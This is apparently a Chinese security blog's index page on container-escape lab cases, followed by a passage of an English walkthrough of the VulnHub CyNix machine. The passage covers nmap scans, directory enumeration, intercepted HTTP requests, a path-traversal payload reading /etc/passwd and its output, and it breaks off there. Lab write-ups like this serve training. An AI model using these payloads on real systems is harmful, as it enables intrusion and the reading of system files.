---
title: 容器边界、网络拓扑与宿主权限
url: https://lucifer11.xyz/knowledge/containers/
source: 0xfd's blog
date: 2026-11-25
fetch_date: 2026-11-26T10:13:48.266686
---

# 容器边界、网络拓扑与宿主权限

![0xfd's blog](/images/fifteen-katana-zero-katana-zero.gif)
[0xfd's blog](/)

by 0xfd

* [首页](/)
* [知识库](/knowledge/)
* [导读](/guide/)
* [分类](/categories/)
* [标签](/tags/)
* [归档](/archives/)
* [关于](/about/)
* 搜索

* 文章目录
* 站点概览

1. [分析重点](#%E5%88%86%E6%9E%90%E9%87%8D%E7%82%B9)
2. [案例与技术索引](#%E6%A1%88%E4%BE%8B%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%B4%A2%E5%BC%95)
3. [LXD 组与宿主文件系统](#LXD-%E7%BB%84%E4%B8%8E%E5%AE%BF%E4%B8%BB%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F)
4. [监控平台、内部 OFBiz 与 SYS\_MODULE](#%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0%E3%80%81%E5%86%85%E9%83%A8-OFBiz-%E4%B8%8E-SYS-MODULE)
5. [GitLab 入口与特权容器](#GitLab-%E5%85%A5%E5%8F%A3%E4%B8%8E%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8)
6. [多层容器网络与备份任务](#%E5%A4%9A%E5%B1%82%E5%AE%B9%E5%99%A8%E7%BD%91%E7%BB%9C%E4%B8%8E%E5%A4%87%E4%BB%BD%E4%BB%BB%E5%8A%A1)
7. [多语言管理面与 Docker 能力](#%E5%A4%9A%E8%AF%AD%E8%A8%80%E7%AE%A1%E7%90%86%E9%9D%A2%E4%B8%8E-Docker-%E8%83%BD%E5%8A%9B)
8. [原型污染与 Pod 权限](#%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E4%B8%8E-Pod-%E6%9D%83%E9%99%90)

![253](/images/fifteen-katana-zero-katana-zero.gif)

253

漏洞分析、利用机制、二进制研究与安全工程

[83
日志](/archives/)

[65
分类](/categories/)

[312
标签](/tags/)

GitHub

E-Mail

Twitter

FB Page

YouTube

Instagram

infosec.exchange

![Creative Commons](https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg)

0%

链接

* atsud0
* 记忆里的纯真
* 小离

# 容器边界、网络拓扑与宿主权限

发表于
2026-11-25

分类于

[云与容器安全](/categories/%E4%BA%91%E4%B8%8E%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/)
，
[容器与编排](/categories/%E4%BA%91%E4%B8%8E%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E4%B8%8E%E7%BC%96%E6%8E%92/)

阅读次数：

本文字数：
23k

阅读时长 ≈
1:25

容器里的 root、宿主文件系统、Docker socket 和 Kubernetes API 代表不同控制面。本章保留原拓扑、挂载、能力和进程身份，按每一次跨边界的实际证据阅读。

容器里的 root、宿主文件系统、Docker socket 和 Kubernetes API 代表不同控制面。本章保留原拓扑、挂载、能力和进程身份，按每一次跨边界的实际证据阅读。

[知识库目录](/knowledge/)
[研究导读](/guide/)
[下载 Markdown](/knowledge/containers/source.md)
展开全部技术记录

## 分析重点

Reddish 的多层网络与备份容器需要对应 IP、端口转发和任务触发。

Ready、Cynix 与 Monitors 分别涉及特权 Docker、LXD 和 SYS\_MODULE。

Unobtainium 的 Pod 权限与 Talkactive 的宿主访问保留原 API、文件与运行条件。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [LXD 组与宿主文件系统](#case-cynix) | cynix | LXD、容器逃逸、Linux |
| [监控平台、内部 OFBiz 与 SYS\_MODULE](#case-monitors) | monitors | OFBiz、Cacti、SYS\_MODULE、容器逃逸 |
| [GitLab 入口与特权容器](#case-ready) | ready | GitLab、Docker、容器逃逸 |
| [多层容器网络与备份任务](#case-reddish) | reddish | Docker、Redis、rsync、端口转发 |
| [多语言管理面与 Docker 能力](#case-talkactive) | talkactive | Docker、Rocket.Chat、MongoDB |
| [原型污染与 Pod 权限](#case-unobtainium) | Unobtainium | 原型污染、Node.js、Kubernetes |

## LXD 组与宿主文件系统

原案例在服务枚举后进入 LXD 权限边界，保留镜像、容器配置及宿主挂载的过程，便于与独立 LXD 研究文章对照。

来源 cynix · 原记录 2020-05-20 · 18 个代码块 · 2 处图片引用

查看分析过程、攻击步骤与完整代码

#### 注意

为了帮助自己更好的成长，适应国际潮流与发展。从这篇文章开始，本人以后所有的技术文章，walkthrough,writeup,及其他乱七八糟的东西，全部用英文，重要的事情强调3遍,全部用英文!全部用英文!全部用英文!以后为适应国际潮流，文章将不定期换用其它国家的语言！！！

#### name

Name: CyNix: 1
Date release: 18 Nov 2019

#### download

Download: https://drive.google.com/open?id=1oV8J4o3R8WP25fnIMy0ZKdZi-97eNP6b
Download (Mirror): https://download.vulnhub.com/cynix/CyNix.ova
Download (Torrent): https://download.vulnhub.com/cynix/CyNix.ova.torrent

#### description

* Level: Intermediate-Hard
* User flag: user.txt
* Root flag: root.txt
* Description: It’s a Boot2Root machine. The machine is VirtualBox compatible but can be used in VMWare as well (not tested but it should work). The DHCP will assign an IP automatically. You have to find and read two flags (user and root) which is present in user.txt and root.txt respectively. Enjoy pwning it!

We recommend that you use VirtualBox and not VMware for this VM

#### information gathering

first use nmap as usual

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` nmap -sn -v 192.168.56.* Nmap scan report for 192.168.56.125 Host is up (0.00016s latency). MAC Address: 08:00:27:FC:8E:E4 (Oracle VirtualBox virtual NIC) ``` |

then Get more detailed information

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ``` | ``` nmap -sV -sC -T4 -v -p- 192.168.56.125 PORT     STATE SERVICE VERSION 80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu)) | http-methods:  |_  Supported Methods: HEAD GET POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 6688/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   2048 6d:df:0d:37:b1:3c:86:0e:e6:6f:84:b9:28:11:ee:68 (RSA) |   256 8f:3e:c0:08:03:13:e8:64:89:f6:f9:63:b3:88:99:2a (ECDSA) |_  256 fb:e3:40:e6:91:0b:3c:bc:b7:0e:c7:bd:ef:a2:93:fc (ED25519) MAC Address: 08:00:27:FC:8E:E4 (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ``` |

* Enumeration

i use dirbuster for Web Directory scanning, get the following results

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` /icons    403 /lavalamp    200 /server-status    403 ``` |

turn to contact page,i use burp got the following request

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ``` | ``` POST /lavalamp/canyoubypassme.php HTTP/1.1 Host: 192.168.56.125 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 83 Origin: http://192.168.56.125 Connection: close Referer: http://192.168.56.125/lavalamp/  name=test&email=ccasdcasdcas%40qq.com&subject=fuckyou&message=wocaonimacasdcasdcasd ``` |

then go to

|  |  |
| --- | --- |
| ``` 1 ``` | ``` http://192.168.56.125/lavalamp/canyoubypassme.php ``` |

check the source code

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` <table width="40%" cellspacing="0" cellpadding="0" margin="20%" class="tb1" style="margin:2% 30%;opacity: 0.0;">    <tr><td align=center style="padding: 3%;"> 	<form method=post action="/lavalamp/canyoubypassme.php">Specify a number: <input type=text name=file placeholder=integer><br><br><input type=submit name=read value="Download the number"></form> ``` |

now change the opacity 0:0 to 1:0, and see what will happen

we got a visible form by doing that,then use burp intercept the data

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ``` | ``` POST /lavalamp/canyoubypassme.php HTTP/1.1 Host: 192.168.56.125 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 35 Origin: http://192.168.56.125 Connection: close Referer: http://192.168.56.125/lavalamp/canyoubypassme.php Upgrade-Insecure-Requests: 1  file=21212&read=Download+the+number ``` |

edit the poc to triggerthe LFI

|  |  |
| --- | --- |
| ``` 1 ``` | ``` file=1../../../etc/passwd&read=Download+the+number ``` |

responese:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 ``` | ```  </td></tr></table> 				<div id="right"></div><div align=center><textarea rows=20 cols=60>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nolog...